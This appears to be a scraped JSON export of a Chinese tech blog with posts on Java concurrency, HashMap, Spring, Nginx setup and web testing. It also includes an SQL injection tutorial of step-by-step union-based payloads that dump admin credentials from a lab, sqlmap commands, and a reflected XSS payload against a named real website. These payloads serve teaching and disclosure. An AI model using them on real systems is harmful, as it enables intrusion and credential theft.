CAS 不成功。CAS 是一个原子性操作，要么成功要么失败，CAS 操作用得比较多的是 sun.misc 包的 Unsafe 类，而 Java 并发包大量使用 Unsafe 类的 CAS 操作，比如：AtomicInteger 整数原子类（本质是自旋锁 + CAS），CAS 不需加锁，提高代码运行效率。也是一种乐观锁方式，我们通常认为在大多数场景下不会出现竞争资源的情况，如果 CAS 操作失败，会不断重试直到成功。 CAS 优点：资源竞争不大的场景系统开销小。 CAS 缺点： 如果 CAS 长时间操作失败，即长时间自旋，会导致 CPU 开销大，但是可以使用 CPU 提供的 pause 指令，这个 pause 指令可以让自旋重试失败时 CPU 先睡眠一小段时间后再继续自旋重试 CAS 操作，jvm 支持 pause 指令，可以让性能提升一些。 存在 ABA 问题，即原来内存地址的值是 A，然后被改为了 B，再被改为 A 值，此时 CAS 操作时认为该值未被改动过，ABA 问题可以引入版本号来解决，每次改动都让版本号 +1。Java 中处理 ABA 的一个方案是 AtomicStampedReference 类，它是使用一个 int 类型的字段作为版本号，每次修改之前都先获取版本号和当前线程持有的版本号比对，如果一致才进行修改操作，并把版本号 +1。 无法保证代码块的原子性，CAS 只能保证单个变量的原子性操作，如果要保证多个变量的原子性操作就要使用悲观锁了。 AQS（AbstractQueuedSynchronizer）原理分析字面意思是抽象的队列同步器，AQS 是一个同步器框架，它制定了一套多线程场景下访问共享资源的方案，Java 中很多同步类底层都是使用 AQS 实现，比如：ReentrantLock、CountDownLatch、ReentrantReadWriteLock，这些 java 同步类的内部会使用一个 Sync 内部类，而这个 Sync 继承了 AbstractQueuedSynchronizer 类，这是一种模板方法模式，所以说这些同步类的底层是使用 AQS 实现。 AQS 内部维护了一个 volatile 修饰的 int state 属性（共享资源）和一个先进先出的线程等待队列（即多线程竞争共享资源时被阻塞的线程会进入这个队列）。因为 state 是使用 volatile 修饰，所以在多线程之前可见，访问 state 的方式有 3 种，getState()、setState()和 compareAndSetState()。 AQS 定义了 3 种资源共享方式： 独占锁（exclusive），保证只有一条线程执行，比如 ReentrantLock、AtomicInteger。 共享锁（shared），允许多个线程同时执行，比如 CountDownLatch、Semaphore。 同时实现独占和共享，比如 ReentrantReadWriteLock，允许多个线程同时执行读操作，只允许一条线程执行写操作。 ReentrantLock 和 CountDownLatch 都是自定义同步器，它们的内部类 Sync 都是继承了 AbstractQueuedSynchronizer，独占锁和共享锁的区别在于各自重写的获取和释放共享资源的方式不一样，至于线程获取资源失败、唤醒出队、中断等操作 AQS 已经实现好了。 ReentrantLock state 的初始值是 0，即没有被锁定，当 A 线程 tryAcquire() 时会独占锁住 state，并且把 state+1，然后 B 线程（即其他线程）tryAcquire() 时就会失败进入等待队列，直到 A 线程 tryRelease() 释放锁把 state-1，此时也有可能出现重入锁的情况，state-1 后的值不是 0 而是一个正整数，因为重入锁也会 state+1，只有当 state=0 时，才代表其他线程可以 tryAcquire() 获取锁。 CountDownLatch 8 人赛跑场景，即开启 8 个线程进行赛跑，state 的初始值设置为 8（必须与线程数一致），每个参赛者跑到终点（即线程执行完毕）则调用 countDown()，使用 CAS 操作把 state-1，直到 8 个参赛者都跑到终点了（即 state=0），此时调用 await() 判断 state 是否为 0，如果是 0 则不阻塞继续执行后面的代码。 tryAcquire()、tryRelease()、tryAcquireShared()、tryReleaseShared() 的详细流程分析 tryAcquire() 详细流程如下： 调用 tryAcquire() 尝试获取共享资源，如果成功则返回 true; 如果不成功，则调用 addWaiter() 把此线程构造一个 Node 节点（标记为独占模式），并使用 CAS 操作把节点追加到等待队列的尾部，然后该 Node 节点的线程进入自旋状态; 线程自旋时，判断自旋节点的前驱节点是不是头结点，并且已经释放共享资源（即 state=0），自旋节点是否成功获取共享资源（即 state=1），如果三个条件都成立则自旋节点设置为头节点，如果不成立则把自旋节点的线程挂起，等待前驱节点唤醒。 tryRelease() 详细流程如下： 调用 tryRelease() 释放共享资源，即 state=0，然后唤醒没有被中断的后驱节点的线程; 被唤醒的线程自旋，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），自旋节点是否成功获取共享资源（即 state=1），如果三个条件都成立则自旋节点设置为头节点，如果不成立则把自旋节点的线程挂起，等待被前驱节点唤醒。 tryAcquireShared() 详细流程如下： 调用 tryAcquireShared() 尝试获取共享资源，如果 state&gt;=0，则表示同步状态（state）有剩余还可以让其他线程获取共享资源，此时获取成功返回; 如果 state&lt;0，则表示获取共享资源失败，把此线程构造一个 Node 节点（标记为共享模式），并使用 CAS 操作把节点追加到等待队列的尾部，然后该 Node 节点的线程进入自旋状态; 线程自旋时，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），再调用 tryAcquireShared() 尝试获取共享资源，如果三个条件都成立，则表示自旋节点可执行，同时把自旋节点设置为头节点，并且唤醒所有后继节点的线程。 如果不成立，挂起自旋的线程，等待被前驱节点唤醒。 tryReleaseShared() 详细流程如下： 调用 tryReleaseShared() 释放共享资源，即 state-1，然后遍历整个队列，唤醒所有没有被中断的后驱节点的线程; 被唤醒的线程自旋，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），再调用 tryAcquireShared() 尝试获取共享资源，如果三个条件都成立，则表示自旋节点可执行，同时把自旋节点设置为头节点，并且唤醒所有后继节点的线程。 如果不成立，挂起自旋的线程，等待被前驱节点唤醒。","categories":[],"tags":[{"name":"Concurrency","slug":"Concurrency","permalink":"https://kayleh.top/tags/Concurrency/"}]},{"title":"Head First Map","slug":"head-first-hashmap","date":"2021-04-17T09:31:12.000Z","updated":"2021-04-17T18:29:25.128Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"深入浅出Map Map是java里边是一个接口,常见的实现类有HashMap、LinkedHashMap、TreeMap和ConcurrentHashMap HashMap底层数据结构是数组+链表/红黑树 LinkedHashMap底层数据结构是数组+链表+双向链表 TreeMap底层数据结构是红黑树 ConcurrentHashMap底层数据结构是数组+链表/红黑树 HashMap 简单总结HashMap： 无序，允许为null，非同步 底层由散列表(哈希表)实现 初始容量和装载因子对HashMap影响挺大的，设置小了不好，设置大了也不好 new一个hashmap时会发生什么?HashMap有几个构造方法,但最主要的就是指定初始值以及负载因子的大小.如果不指定,默认hashmap的大小为16,负载因子的大小为0.75. HashMap的大小只能是2次幂,（因为只有大小为2次幂时，才能合理用位运算替代取模） 假如传一个10进去,实际大小是16. 假如传入一个7进去,hashmap最终大小是8,具体实现在tableSizeFor可以看到 把元素放进hashmap的时候，需要算出这个元素所在的位置（hash），在hashmap里用的是位运算来代替取模，能够更加高效地算出该元素所在的位置。 而负载因子的大小决定着哈希表的扩容和哈希冲突。 比如默认hashmap的大小为16,负载因子的大小为0.75.这意味着数组最多只能放16×0.75=12个元素，一旦超过12个元素，则哈希表需要扩容。每次Put元素的时候都会检查hashmap的大小有没有超过这个阈值，如果超过则扩容。 鉴于（HashMap的大小只能是2次幂），所以扩容的时候默认扩容为原来的2倍。 扩容是耗时的,也可以通过调高负载因子来减少扩容. 但是一般不推荐这样做,因为这样意味着哈希冲突的概率会增高,哈希冲突的概率增高同样会耗时(因为查找的速度变慢了) Put元素怎么计算hash？ put元素的时候，先算出正常的哈希值，然后与高16位做异或运算，产生最终的哈希值。好处是增加了随机性，减少了碰撞冲突的可能性。 put和get的实现 put 首先对key做hash运算，计算出该key所在的index。 如果没碰撞，直接放到数组中，如果碰撞了，需要判断目前数据结构是链表还是红黑树，根据不同的情况来进行插入。 假如key相同的，则替换到原来的值。最后判断哈希表是否满了（当前哈希表大小×负载因子），如果满了，则扩容。 get 还是对key做hash运算，计算出该key所在的index，然后判断是否有哈希冲突。 假如没有冲突则直接返回。假设有冲突则判断目前数据结构是链表还是红黑树，分别从不同的数据结构中取出。 在hashmap中，怎么判断一个元素是否相同？首先比较hash值，随后会用==运算符和equals()来判断该元素是否相同。 说白了，就是： 如果只有hash值相同，那说明该元素hash冲突了，如果hash值和equal() || == 都相同，那说明该元素是同一个。 什么情况下会转红黑树？ 当数组大小&gt;64且链表的大小&gt;8的时候才会将链表转为红黑树。当红黑树大小为6时，会退化为链表。 这里转红黑树退化为链表的操作主要出于查询和插入时对性能的考量 链表的查询时间复杂度为O(N),插入时间复杂度为O(1),红黑树查询和插入时间复杂度为O(logN) 线程安全？ HashMap是线程不安全的，在多线程环境下，HashMap有可能会有数据丢失和获取不了最新数据的问题，比如线程A put进去了，线程B get不出来。 LinkedHashMap 实际上继承了HashMap，在HashMap的基础上维护了一个双向链表。 有了这个双向链表，插入的顺序是有序的。 LinkedHashMap在遍历的时候，实际上是用的是双向链表来遍历的，所以LinkedHashMap的大小不会影响到遍历的性能 TreeMap TreeMap的key不能为null（如果为null就不能排序），TreeMap有序是通过Comparator来进行比较的，如果 Comparator为null，那么就使用自然顺序 ConcurrentHashMap ConcurrentHashMap是JUC包下的线程安全的Map实现类，他能支持高并发的访问和更新。 线程安全的Map实现类还有HashTable，还有可以使用Collections来包装出一个线程安全的Map。 但是HashTable还是Collections来包装出来的，都比较低效，因为都是直接在外层套synchronize。 所以一般有线程安全问题考量的，都使用ConcurrentHashMap。 ConcurrentHashMap通过在部分加锁和利用CAS算法来实现同步，在get的时候没有加锁，Node都用了volatile给修饰。 在扩容时，会给每个线程分配对应的区间，并且为了防止putVal导致数据不一致，会给线程的所负责的区间加锁。","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"Spring Cyclic Ependencies","slug":"Spring-cyclic-ependencies","date":"2021-04-16T07:36:37.000Z","updated":"2021-04-16T16:00:21.003Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"Spring是怎么解决循环依赖的？首先站在Spring整个Framework体系而言的话，Spring的Bean是由一个BeanDefinition来的，就是在Spring当中，有一个叫建模的类BeanDefinition，Spring的Bean有一系列比较复杂的生命周期： 首先，Spring容器启动。 spring进行扫描 反射后封装成beanDefinition对象，放入beanDefinitionMap 遍历map 验证（是否单例、是否延迟加载、是否抽象） 推断构造方法（ 把当前这个Spring Bean所代表的类当中的构造方法得到一个最佳的一个构造方法 ） 准备开始进行实例 去单例池中查，没有——》去二级缓存中找，没有提前暴露——》生成一个objectFactory对象暴露到二级缓存中——》属性注入，发现依赖Y——》此时Y开始它的生命周期直到属性注入，发现依赖X-&gt;X又走一遍生命周期，当走到去二级缓存中找的时候找到了-&gt;往Y中注入X的objectFactory对象-&gt;完成循环依赖。 1、为什么要使用X的objectFacory对象而不是直接使用X对象？ 利于拓展，程序员可以通过beanPostProcess接口操作objectFactory对象生成自己想要的对象 2、是不是只能支持单例(scope=singleton)而不支持原型(scope=prototype)？ 是。因为单例是spring在启动时进行bean加载放入单例池中，在依赖的bean开始生命周期后，可以直接从二级缓存中取到它所依赖的bean的objectFactory对象从而结束循环依赖。而原型只有在用到时才会走生命周期流程，但是原型不存在一个已经实例化好的bean，所以会无限的创建-&gt;依赖-&gt;创建-&gt;依赖-&gt;…。 3、循环依赖是不是只支持非构造方法？ 是。类似死锁问题","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"Head First Nginx","slug":"Head-First-nginx","date":"2021-04-14T21:55:17.000Z","updated":"2021-04-15T15:12:41.680Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"公司产品出现瓶颈？我们公司项目刚刚上线的时候，并发量小，用户使用的少，所以在低并发的情况下，一个jar包启动应用就够了，然后内部tomcat返回内容给用户。但是慢慢的，使用我们平台的用户越来越多了，并发量慢慢增大了，这时候一台服务器满足不了我们的需求了。于是我们横向扩展，又增加了服务器。这个时候几个项目启动在不同的服务器上，用户要访问，就需要增加一个代理服务器了，通过代理服务器来帮我们转发和处理请求。我们希望这个代理服务器可以帮助我们接收用户的请求，然后将用户的请求按照规则帮我们转发到不同的服务器节点之上。这个过程用户是无感知的，用户并不知道是哪个服务器返回的结果，我们还希望他可以按照服务器的性能提供不同的权重选择。保证最佳体验！所以我们使用了Nginx。 什么是Nginx？Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为俄罗斯访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，第一个公开版本0.1.0发布于2004年10月4日。2011年6月1日，nginx 1.0.4发布。 其特点是占有内存少，并发能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使用nginx网站用户有：百度、京东、新浪、网易、腾讯、淘宝等。在全球活跃的网站中有12.18%的使用比率，大约为2220万个网站。 Nginx 是一个安装非常的简单、配置文件非常简洁（还能够支持perl语法）、Bug非常少的服务。Nginx 启动特别容易，并且几乎可以做到7*24不间断运行，即使运行数个月也不需要重新启动。你还能够不间断服务的情况下进行软件版本的升级。 Nginx代码完全用C语言从头写成。官方数据测试表明能够支持高达 50,000 个并发连接数的响应。 Nginx作用？ Http代理，反向代理：作为web服务器最常用的功能之一，尤其是反向代理。 正向代理反向代理 Nginx提供的负载均衡策略有2种：内置策略和扩展策略。内置策略为轮询，加权轮询，Ip hash。扩展策略，就天马行空，只有你想不到的没有他做不到的。 轮询加权轮询iphash对客户端请求的ip进行hash操作，然后根据hash结果将同一个客户端ip的请求分发给同一台服务器进行处理，可以解决session不共享的问题。 动静分离，在我们的软件开发中，有些请求是需要后台处理的，有些请求是不需要经过后台处理的（如：css、html、jpg、js等等文件），这些不需要经过后台处理的文件称为静态文件。让动态网站里的动态网页根据一定规则把不变的资源和经常变的资源区分开来，动静资源做好了拆分以后，我们就可以根据静态资源的特点将其做缓存操作。提高资源响应的速度。 目前，通过使用Nginx大大提高了我们网站的响应速度，优化了用户体验，让网站的健壮性更上一层楼！ Nginx的安装windows下安装1、下载nginx http://nginx.org/en/download.html 下载稳定版本。以nginx/Windows-1.16.1为例，直接下载 nginx-1.16.1.zip。下载后解压，解压后如下： 2、启动nginx 有很多种方法启动nginx (1)直接双击nginx.exe，双击后一个黑色的弹窗一闪而过 (2)打开cmd命令窗口，切换到nginx解压目录下，输入命令 nginx.exe ，回车即可 3、检查nginx是否启动成功 直接在浏览器地址栏输入网址 http://localhost:80 回车，出现以下页面说明启动成功！ 4、配置监听 nginx的配置文件是conf目录下的nginx.conf，默认配置的nginx监听的端口为80，如果80端口被占用可以修改为未被占用的端口即可。 当我们修改了nginx的配置文件nginx.conf 时，不需要关闭nginx后重新启动nginx，只需要执行命令 nginx -s reload 即可让改动生效 5、关闭nginx 如果使用cmd命令窗口启动nginx， 关闭cmd窗口是不能结束nginx进程的，可使用两种方法关闭nginx (1)输入nginx命令 nginx -s stop(快速停止nginx) 或 nginx -s quit(完整有序的停止nginx) (2)使用taskkill taskkill /f /t /im nginx.exe 1234taskkill是用来终止进程的，&#x2F;f是强制终止 .&#x2F;t终止指定的进程和任何由此启动的子进程。&#x2F;im示指定的进程名称 . linux下安装1、安装gcc 安装 nginx 需要先将官网下载的源码进行编译，编译依赖 gcc 环境，如果没有 gcc 环境，则需要安装： 1yum install gcc-c++ 2、PCRE pcre-devel 安装 PCRE(Perl Compatible Regular Expressions) 是一个Perl库，包括 perl 兼容的正则表达式库。nginx 的 http 模块使用 pcre 来解析正则表达式，所以需要在 linux 上安装 pcre 库，pcre-devel 是使用 pcre 开发的一个二次开发库。nginx也需要此库。命令： 1yum install -y pcre pcre-devel 3、zlib 安装 zlib 库提供了很多种压缩和解压缩的方式， nginx 使用 zlib 对 http 包的内容进行 gzip ，所以需要在 Centos 上安装 zlib 库。 1yum install -y zlib zlib-devel 4、OpenSSL 安装OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及 SSL 协议，并提供丰富的应用程序供测试或其它目的使用。nginx 不仅支持 http 协议，还支持 https（即在ssl协议上传输http），所以需要在 Centos 安装 OpenSSL 库。 1yum install -y openssl openssl-devel 5、下载安装包 手动下载.tar.gz安装包，地址：https://nginx.org/en/download.html 下载完毕上传到服务器上 /root 6、解压 12tar -zxvf nginx-1.18.0.tar.gzcd nginx-1.18.0 7、配置 使用默认配置，在nginx根目录下执行 ​ 1、./configure 是用来检测你的安装平台的目标特征的。比如它会检测你是不是有CC或GCC，并不是需要CC或GCC，它是个shell脚本。 2、make 是用来编译的，它从Makefile中读取指令，然后编译。 3、make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。 注意：AUTOMAKE和AUTOCONF是非常有用的用来发布C程序的东西。 123./configuremakemake install 查找安装路径： whereis nginx Nginx常用命令123456cd /usr/local/nginx/sbin/./nginx 启动./nginx -s stop 停止./nginx -s quit 安全退出./nginx -s reload 重新加载配置文件ps aux|grep nginx 查看nginx进程 启动成功访问 服务器ip:80 注意：如何连接不上，检查阿里云安全组是否开放端口，或者服务器防火墙是否开放端口！相关命令： 1234567891011121314151617181920# 开启service firewalld start# 重启service firewalld restart# 关闭service firewalld stop# 查看防火墙规则firewall-cmd --list-all# 查询端口是否开放firewall-cmd --query-port=8080/tcp# 开放80端口firewall-cmd --permanent --add-port=80/tcp# 移除端口firewall-cmd --permanent --remove-port=8080/tcp#重启防火墙(修改配置后要重启防火墙)firewall-cmd --reload# 参数解释1、firwall-cmd：是Linux提供的操作firewall的一个工具；2、--permanent：表示设置为持久；3、--add-port：标识添加的端口； 演示 1234567upstream lb&#123; server 127.0.0.1:8080 weight=1; server 127.0.0.1:8081 weight=1;&#125;location / &#123; proxy_pass http://lb;&#125;","categories":[],"tags":[{"name":"middleware","slug":"middleware","permalink":"https://kayleh.top/tags/middleware/"}]},{"title":"Web Test Combat","slug":"web-test-combat","date":"2021-04-13T08:50:01.000Z","updated":"2021-04-14T11:05:35.806Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"Web测试要点 功能测试 -(最基本) 链接测试 1.所有链接是否链接到该链接的页面 2.页面是否存在 3.不存在孤立页面 表单测试 1提交数据——&gt;注册(数据库 新增), 修改订单(数据库 改) 常用控件:输入框,下拉框,上传文件(图片,Excel,txt等),提交按钮,单选多选 输入框:长度,数据类型,必填,重复 空格和业务约束 下拉框:默认信息,数据完整性/正确性,第一条最后一条 上传文件(图片,Excel,txt等):大小,格式,尺寸,数量等. 文件本身的内容规则验证 提交按钮:支持回车/单击;弱网测试 ,快速点击是否重复提交,提交内容是否涉及加密 搜索测试 输入框(按时间搜索),下拉框 假设:搜索条件A,B,C,D 任单个条件查询:下拉框,输入框(模糊搜索,超长搜索,不存在条件,为空) 时间搜索 开始时间,结束时间 开始时间=结束时间 ( 同一天数据) 开始时间&lt;结束时间(造跨年 跨天 跨月的数据) 开始时间&gt;结束时间(异常) 手动输入,格式 删除测试 没有数据,删除 选择一条数据/批量选择/全选,删除. 删除二次确认.且删除后合理提示 删除数据关联性 数据库角度,删,确认数据库是否及时更新 cookie,session测试 存储用户信息的,记录用户身份给予后续操作通行证 确认浏览器存储cookie目录有无cookie相关信息 保存时间之外,cookie是否正常 删除浏览器所有的cookie文件,再次登录,会怎么处理 鉴权 数据库测试 搭建测试环境,初始化sql脚本 界面/可用性测试 是否跟产品原型/ui效果图一致 功能测试同步测试 兼容性测试 主要考虑浏览器 主流浏览器+内核(ie,firefox,Chrome,opera) 浏览器测试工具IEtest 功能测试同步关注 接口测试 确保后端代码的功能实现 jmeter 安全测试 sql注入，跨站攻击 漏洞扫描appscan 性能测试 jmeter/loadrunner","categories":[],"tags":[{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"}]},{"title":"Reflected XSS Vulnerability in Font Download Website","slug":"Reflected-XSS-Vulnerability-in-Font-Download-Website","date":"2021-04-10T10:26:29.000Z","updated":"2021-04-15T15:11:27.382Z","comments":true,"path":"Reflected-XSS-Vulnerability-inFont-Download-Website/","link":"","permalink":"https://kayleh.top/Reflected-XSS-Vulnerability-inFont-Download-Website/","excerpt":"","text":"字体下载网站的反射XSS漏洞 URL:http://www.ztxz.org 搜索框输入： 1&lt;script&gt;alert(1)&lt;/script&gt; 会出现弹窗，证明反射XSS的存在。 http://www.ztxz.org/search/?key=%3Cscript%3Ealert(1)%3C/script%3E 用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。例如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作。它的利用过程如图所示。 反射型XSS不会永久存储用户的数据，仅发生在用户的一次访问过程之后。这个过程就像一次反射，因此得名反射型XSS。反射型XSS的触发条件比较苛刻，需要攻击者想方设法引导用户点击链接，但产生的危害不容忽视。 参考资料：https://www.bugbank.cn/q/article/598438535ecec4fe1c216740.html http://blog.csdn.net/binyao02123202/article/details/9041113","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://kayleh.top/tags/security/"}]},{"title":"SQL injection","slug":"SQL注入漏洞","date":"2021-04-05T17:48:59.000Z","updated":"2021-04-15T15:08:14.772Z","comments":true,"path":"SQL-injection-vulnerability/","link":"","permalink":"https://kayleh.top/SQL-injection-vulnerability/","excerpt":"","text":"SQL注入 https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html 常见的几种SQL注入 1.数字型2.字符型3.文本型4.搜索型(POST/GET)5.cookie注入6.SQL盲注7.编码注入8.宽字节注入 MySQL报错注入基本流程 1.判断sql注入2.数据库权限判断3.判断字段数4.查询库名5.查表名6.查字段7.查数据 1.数字型1.判断sql注入 提交单引号 1http://localhost/sqls/index.php?id=2' and大法和or大法 在参数后面加上and 1 = 1 12http://localhost/sqls/index.php?id=2 and 1 = 1 //可以查询http://localhost/sqls/index.php?id=2 and 1 = 2 //查询错误 可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。 接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。 1http://localhost/sqls/index.php?id=5 or 1 = 1 加法和减法 加法和减法的使用要区别是数字型还是字符型的注入、然后来区分了、可以看他后面的参数如果是数字、就一定是数字型、如果是一些字母的话就是字符型注入。 12select * from user where id&#x3D;4 &#x2F;&#x2F;数字型注入 sql 语句select * from user where username&#x3D;’fendo’ &#x2F;&#x2F;字符型注入 sql 语句 加法 我们在参数输入1+1，看看返回的数据是不是id等于2的结果，这里注意一下+号在SQL语句是有特效含义的，所以我们要对其进行url编码，最后也就是%2b。 1select * from user where id=1+1 //第二条数据 减法 减法是同样的道理，不过不需要对-号进行url编码了 1select * from user where id=2-1 //第一条数据 数据库权限判断 12345678910and ord(mid(user(),1,1))=114解释:判断ROOT权限 返回正确存在 ----------------------------------或 and (select count(*) from mysql.user)&gt;0解释:and (select count(*) from mysql.user)&gt;0 /* 如果结果返回正常,说明具有读写权限。and (select count(*) from mysql.user)&gt;0 /* 返回错误，应该是管理员给数据库帐户降权了。 判断字段数 常用的两种猜解方式: 用union联合查询：and 1=1 union select 1,2,3,4,5…… 或 union select null,null,null….. UNION SELECT 联合查询：可以用于一个或多个SELECT的结果集，但是他有一个条件，就是两个select查询语句的查询必须要有相同的列才可以执行，利用这个特性我们可以进行对比查询，也就是说当我们union select的列与它查询的列相同时，页面返回正常。在and后面加上1=1或1=2的作用后面会讲。 例： 当字段为2时页面返回错误 123456http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2 //错误http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2,3 //正常查询http://localhost/sqls/index.php?id=2 and 1 = 1 union select 1,2,3,4 //错误-----说明字段数就是3，输入的数大于或小于字段数时都会报错。使用 union select null,null,null 是一样的http://localhost/sqls/index.php?id=2 and 1 = 1 union select null,null,null 2.用order by 查询“order by * — order by order by查询：在sql语句中是对结果集的指定列进行排序，比如我们想让结果集按照第一列排序就是 order by 1 按照第二列排序 order by 2 依次类推，按照这个原理我们来判断他的字段数，如果我们按照他的第1列进行排序数据库会返回正常，但是当我们按照第100列排序，但是数据库中并不存在第100列，从而报错。 同union 这里有两个问题 第一个：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。第一种：我们让第一个查询的结果始终为假 1http://localhost/sqls/index.php?id=2 and 1=2 union select null,null,null 第二种：通过limit语句，limit在mysql中是用来分页的，通过他可以从查询出来的数据中获取我们想要的数据 limit语法: 1LIMIT [offset] rows | rows OFFSET offset LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，初始记录行的偏移量是 0(而不是 1)。 列: 1SELECT * FROM table LIMIT 5,10; &#x2F;&#x2F; 检索记录行 6-15 在地址后面加入以下代码 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,null,null limit 1,1 第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。 查询库名 版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。 通过下面的语句可以判断数据库版本 1and ord(mid(version(),1,1))&gt;51 解释1： 确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，当版本大于3.0时才能使用union方法；解释2：ord()是mysql的函数用于获取二进制码；解释3：mid()是mysql的函数用于截位操作；解释4：version()是mysql的函数用于获取当前数据库的版本； 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and ord(mid(version(),1,1))&gt;51 方法一: 可以直接使用mysql自带函数database()查询得到数据库名： 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select 1,database(),3 limit 1,1 方法二: 使用以下语句语句得到所有的数据库名 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,schema_name,null from information_schema.schemata 还可以获取第一个库名： 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,1 并没有显示数据库名而显示的是第一条语句查询出来的结果。在union前面加上and 1=2，就能显示出来了。 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,1 获取第二个库名： 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select null,schema_name,null from information_schema.schemata limit 0,2 查表名 在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表。 方法一: 用group_concat它可以返回查询的所有结果，因为我们需要通过命名判断该我们需要的敏感数据。 group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;test&#39; 方法二: 使用下面的语句也是可以查出来的 1http://localhost/sqls/index.php?id=2 union select null,table_name,null from information_schema.tables where table_schema='test' 查字段 在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。 方法一: 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;sqltest&#39; 也可以查看admin表中的字段。 方法二: 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,column_name,null from information_schema.columns where table_schema&#x3D;&#39;test&#39; and table_name&#x3D;&#39;admin&#39; 查数据 最终想得到的就是字段里的内容了、前面的数据库名、表名都获得了、获取值就很简单了。 方法一: 查询sqltest表: 1http://localhost/sqls/index.php?id=2 union select 1,group_concat(id,title,content),3 from `sqltest` 查询admin表: 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,group_concat(id,user,pwd),3 from admin 方法二: 查询sqltest表: 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select null,title,content from sqltest 查询admin表: 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 union select id,user,pwd from admin 方法三: 查询admin表: 1http:&#x2F;&#x2F;localhost&#x2F;sqls&#x2F;index.php?id&#x3D;2 and 1&#x3D;2 union select 1,2,concat(user,0x3c,pwd) from admin sqlmap 工具：sqlmap 靶场：https://rimovni.exeye.run/hugkudure/well sqlmap注入常见用法： 检查注入点 sqlmap -u “http://ooxx.com/a.php?id=1“ 列数据库信息 sqlmap -u “http://ooxx.com/a.php?id=1“ —dbs 指定数据库名列出所有表 sqlmap -u “http://ooxx.com/a.php?id=1“ -D dbsname —tables 指定数据库名表名列出所有字段 sqlmap -u “http://ooxx.com/a.php?id=1“ -D dbsname -T tablename —columns 